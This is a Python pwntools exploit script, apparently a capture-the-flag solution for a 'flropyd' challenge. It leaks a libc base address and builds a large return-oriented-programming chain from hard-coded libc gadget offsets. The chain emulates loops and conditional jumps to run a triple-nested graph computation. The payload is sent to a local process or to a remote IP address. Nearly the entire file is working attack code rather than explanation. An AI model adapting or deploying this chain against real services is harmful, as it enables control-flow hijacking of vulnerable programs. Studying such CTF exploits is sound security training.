#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
#pwn_file="./flropyd"
pwn_file="./bak"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.186.63.203",6666)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()
r.recvuntil(": ")
libc_addr = int(r.recvline(),16)-0x97070
debug()

pop_rbx = lambda x: p64(libc_addr + 0x3ea8b) + p64(x)
pop_rdx = lambda x: p64(libc_addr + 0x1b96) + p64(x)
pop_rdi = lambda x: p64(libc_addr + 0x2155f) + p64(x)
pop_rsi = lambda x: p64(libc_addr + 0x1306da) + p64(x)
pop_rax = lambda x: p64(libc_addr + 0x439c8) + p64(x)
pop_rcx = lambda x: p64(libc_addr + 0x3eb0b) + p64(x)
pop_r15 = lambda x: p64(libc_addr + 0x2155e) + p64(x)
pop_rbp = lambda x: p64(libc_addr + 0x22d45) + p64(x)
pop_r12 = lambda x: p64(libc_addr + 0x9f2c8) + p64(x)
mov_da = lambda : p64(0x1415dd + libc_addr)
mov_sd = lambda : pop_rax(0x040144a) + pop_rcx(libc_addr + 0x12e7ec) + p64(0x99e20 + libc_addr) + p64(0)
mov_sa = lambda  : mov_da() + mov_sd()# mov rsi,rax
mov_as = lambda : p64(libc_addr + 0x587f3) # mov rax,rsi
nop = lambda : p64(0x040144B)
#mov rax, rsi ; ret
maps = 0x602068
all_num = 0x602060
debug_num = 0x602000
loop1 = 0x61a000
loop2 = 0x61a008
loop3 = 0x61a010
tmp1 = 0x61a018 # j<<6
tmp2 = 0x61a020 # j<<6 + k
tmp3 = 0x61a028 # (j << 6) + i
tmp4 = 0x61a030 # i<<6
tmp5 = 0x61a038 # i<<6 + k
reg1 = 0x61a040
reg2 = 0x61a048
reg3 = 0x61a050
reg4 = 0x61a058
reg5 = 0x61a060
reg6 = 0x61a068
tmp0 = 0x61a070 # everyone can use it

movq_rdi_rcx= libc_addr + 0xb6a58
#mov qword ptr [rdi + 0x10], rcx ; ret
push_call = libc_addr + 0x22c08
#push rax ; call rbx
#0x23992 pop r12;ret
#0x00000000000989ea : pop rdi ; jmp rax
#0x0000000000052419 : mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret
def load_ax(addr):
    return pop_rsi(addr-0x70) + p64(0x52419 + libc_addr )+ mov_as()
# add rax, rdi ; ret

def load_di(addr):
    # affect rdi
    return pop_rdi(addr-0xe0) + pop_rax(0x40144B) + p64(0x7f039 + libc_addr)


def load_cx(addr):
    return pop_rcx(0) + pop_rax(addr-0x39) + p64(0x2b6fd + libc_addr)

def save_Im(addr,value):
    value = value & 0xffffffffffffffff
    return pop_rdx(value) + pop_rdi(addr) + p64(0xa81eb + libc_addr)

def save_ax(addr):
    return pop_rdi(addr) + p64(0x3fdfa+libc_addr)

def add(dst,mem1,mem2):
    return load_di(mem1) + load_ax(mem2) + p64(0xac12c+libc_addr) + save_ax(dst)

def add_const(dst,reg,const):
    return load_ax(reg) + pop_rsi(const) + p64(0xac21c+libc_addr) + save_ax(dst) # add rax,rsi;ret

def load_m(reg,mem):
    return load_ax(mem) + p64(0x145c98 + libc_addr ) + save_ax(reg)

def store_m(reg,mem):
    return load_ax(reg) + mov_da() + load_ax(mem) + p64(libc_addr + 0x118d45)

def goto(rsp_mem):
    rax_mem = 0x61a808
    rcx_mem = 0x61a810
    data= [ 
        save_Im(rcx_mem,0x4014CC) + pop_rcx(0x61a810),
        # add junk code for protecting stack when call
        pop_rsi(0) + p64(libc_addr + 0x1d6658), # or rsi, rsp ; jmp qword ptr [rcx]
        pop_rbp(rsp_mem + 0x6b) + p64(0x0131da3+ libc_addr), #  add rsi, qword ptr [rbp - 0x6b] ; mov rax, rdi ; return
        pop_r12(0x4014B2) + mov_as() + pop_rcx(libc_addr + 0x106899) + p64(0x99e20 + libc_addr) + p64(0) , # pop r14,jmp rcx ->  mov    r8,rax; call r12; set r8 = rsp + ... fuck call..
        pop_rdx(0x4014B4) + p64(libc_addr + 0x3eca9) # set rsp !
    ]
    data = "".join(data)
    return data

cnt = 0
def if_great_then_else(mem1,mem2,then,els):
    global cnt
    rdi_mem = 0x61a900 + cnt*0x100
    rsi_mem = 0x61a930 + cnt*0x100
    rax_mem = 0x61a950 + cnt*0x100 # 0x10
    rbp_mem = 0x61a970 + cnt*0x100
    true_mem = 0x61a990 + cnt*0x100
    cnt +=1
    #0x7ffff7896924 <__strcpy_sse2_unaligned+996>:        ja     0x7ffff789692e
    #0x7ffff7896926 <__strcpy_sse2_unaligned+998>:        mov    QWORD PTR [rdi],rcx
    #0x7ffff7896929 <__strcpy_sse2_unaligned+1001>:       ret

    #0x7ffff789692e <__strcpy_sse2_unaligned+1006>:       add    BYTE PTR [rax],al
    #0x7ffff7896930 <__strcpy_sse2_unaligned+1008>:       mov    rcx,QWORD PTR [rsi]
    #0x7ffff7896933 <__strcpy_sse2_unaligned+1011>:       mov    dx,WORD PTR [rsi+0x8]
    #0x7ffff7896937 <__strcpy_sse2_unaligned+1015>:       mov    QWORD PTR [rdi],rcx
    #0x7ffff789693e <__strcpy_sse2_unaligned+1022>:       ret

    # 0x0000000000052818 : cmp dword ptr [rax], r9d ; xor eax, eax ; pop rbx ; ret
    # 0x00000000000c1709 : cmp dword ptr [rax + 0x63], ecx ; ret
    # 69f42 : mov r8, rcx ; jmp rax
    # 0x000000000003eca7 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
    # 0x3eb0b : pop rcx,ret

    # rsi: branch 1
    # rcx: branch 2
    # rdi store branch dst

    # 0x617c8: add r9d, eax ; mov eax, r9d ; ret
    # 0x2bce8: xor r9d, r9d ; call r15

    # dst1 rcx
    # dst2 [rsi]
    branch_false="".join([
        els,
        # we can exit normally ...

    ])
    print ("branch fasle:")
    print (len(branch_false))
    branch_true="".join([
        then,
        # mov rsp,r8...
        save_Im(true_mem,len(branch_false) + 0x68),
        goto(true_mem)
    ])
    data = [save_Im(rsi_mem, 0x68),
            load_cx(mem2) + pop_rax(mem1-0x63) + p64(0x0c1709 + libc_addr),
            pop_rax(rax_mem) + pop_rcx(len(branch_true) +  0x68) + pop_rsi(rsi_mem) + pop_rdi(rdi_mem) + p64(0xb6924 + libc_addr),# set [rdi] = rsi when  true branch go else [rdi] = rcx
            # get esp add length from [rdi]
            # get current rsp
            # 0x000000000015d29e : mov eax, dword ptr [rbp + 8] ; mov rsi, rsp ; mov rdi, rbp ; call qword ptr [rax]
#            save_Im(rbp_mem,0x1000) + save_Im(rax_mem,0x15d29e+libc_addr) + save_Im(rax_mem+8,0x4014B2) + pop_rax(rax_mem+8)
            goto(rdi_mem),
            branch_true,
            branch_false
            ]
    return "".join(data)

#0x00000000001404f2 : ror byte ptr [rax + 1], cl ; sal esi, cl ; ret
# 1404f5
def sl(dst,mem,dis):
    return load_ax(mem) + mov_sa() + pop_rcx(dis)+ p64(0x1404f5 + libc_addr ) + \
            mov_as() + save_ax(dst)
def cp(mem1,mem2):
    return load_ax(mem2) + save_ax(mem1)



"""
save_Im(0x61a008,0),
save_Im(0x61a010,0),
save_Im(0x61a018,0),
save_Im(0x61a020,0),
save_Im(0x61a028,0),
save_Im(0x61a030,0),
save_Im(0x61a038,0),
save_Im(0x61a040,0),
save_Im(0x61a048,0),
save_Im(0x61a050,0),
save_Im(0x61a058,0),
save_Im(0x61a060,0),
save_Im(0x61a068,0),
"""

loop1_rsp_mem = 0x61a080
loop2_rsp_mem = 0x61a088
loop3_rsp_mem = 0x61a090

loop3_break_mem = 0x61a098
loop2_break_mem = 0x61a0a0
loop1_break_mem = 0x61a0a8
debug_num = 0x602000
once_num = 0x602028
loop3_rsp_mem_1 = 0x61a0b0

inner = "".join([
    sl(tmp1,loop2,6) + add(tmp1,tmp1,loop3) + sl(tmp1,tmp1,3) + add_const(reg4,tmp1,maps) ,# &map[(j << 6) + k]
    sl(tmp2,loop2,6) + add(tmp2,tmp2,loop1) + sl(tmp2,tmp2,3) + add_const(reg5,tmp2,maps),# &map[(j << 6) + i]
    sl(tmp3,loop1,6) + add(tmp3,tmp3,loop3) + sl(tmp3,tmp3,3) + add_const(reg6,tmp3,maps),# &map[(i << 6) + k]
    # get value from pointer
    load_m(reg1,reg4) + load_m(reg5,reg5) + load_m(reg6,reg6),
    add(reg5,reg5,reg6),
    if_great_then_else(reg1,reg5,store_m(reg5,reg4),nop()),
])
print hex(len(inner))
#inner = nop()*352
loop3_code = "".join([
        save_Im(loop3,0),
        # here:
        pop_rax(0xdeadbedd),
        if_great_then_else(all_num,loop3,inner,goto(loop3_break_mem)),
        pop_rax(0xdeadbee3),
        nop()*3,
        add_const(loop3,loop3,1),
        goto(loop3_rsp_mem) # goto here
])

loop2_code = "".join([
        save_Im(loop2,0),
        # here:
        pop_rax(0xdeadbee2), #
        if_great_then_else(all_num,loop2,loop3_code ,goto(loop2_break_mem)),
        pop_rax(0xdeadbee2), # loop3 jump here

        nop()*3,
        add_const(loop2,loop2,1),
        goto(loop2_rsp_mem) # goto here
])

loop1_code = "".join([
        save_Im(loop1,0),
        # here:
        pop_rax(0xdeadbee1), # loop 1 jump here
        if_great_then_else(all_num,loop1,loop2_code ,goto(loop1_break_mem)),
        pop_rax(0xdeadbee1), # loop 1 jump here
        nop()*3,
        add_const(loop1,loop1,1),
        goto(loop1_rsp_mem) # goto here
])

rop=[
    "a"*0x10,
    p64(0x60A098) , save_Im(once_num,1),
#    save_Im(loop1_rsp_mem,0xffffffffffffea50), # ok
#    save_Im(loop2_rsp_mem,0xffffffffffffeea0), # ok
    save_Im(loop1_rsp_mem,-len(loop1_code)+0x90), # ok
    save_Im(loop2_rsp_mem,-len(loop2_code)+0x90), # ok
    save_Im(loop3_rsp_mem,-len(loop3_code)+0x90),
    
    save_Im(loop1_break_mem,0x198), # ok
    save_Im(loop2_break_mem,0x330), # ok
    save_Im(loop3_break_mem,0x330),# ok
    #save_Im(loop1_break_mem,0x198), # ok
    #save_Im(loop2_break_mem,0x330), # ok
    #save_Im(loop3_break_mem,0x330),# ok
    loop1_code,
#    pop_rax(0)+p64(libc_addr + 0x43120)
    p64(0xdeadbeef)
]
"""
rop=[
    "A"*0x18,
    save_Im(reg1,10),save_Im(reg2,3),
    if_great_then_else(reg1,reg2,save_Im(reg1,1),save_Im(reg1,10)),
    p64(0xdeadbeef)
]
"""
code = "".join(rop).ljust(0x10000,"\x00")
r.sendlineafter("chain",code)


r.interactive()



"""
0x7ffffffee290 loop3

"""




